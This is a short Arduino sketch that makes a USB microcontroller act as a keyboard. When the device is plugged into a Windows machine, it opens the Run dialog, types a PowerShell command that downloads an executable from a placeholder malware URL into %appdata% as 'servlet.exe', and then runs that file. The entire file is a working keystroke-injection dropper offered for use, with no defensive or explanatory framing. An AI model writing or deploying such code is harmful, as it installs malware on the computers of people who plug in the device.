#include "HID-Project.h"

void setup() {
  delay(300);
  Keyboard.begin();
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.println(F("powershell -command \"Invoke-WebRequest -Uri 'http://my.malware.url.here' -OutFile '%appdata%\\servlet.exe'\""));
  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  
  Keyboard.println(F("%appdata%\\servlet.exe"));
}

void loop() {}
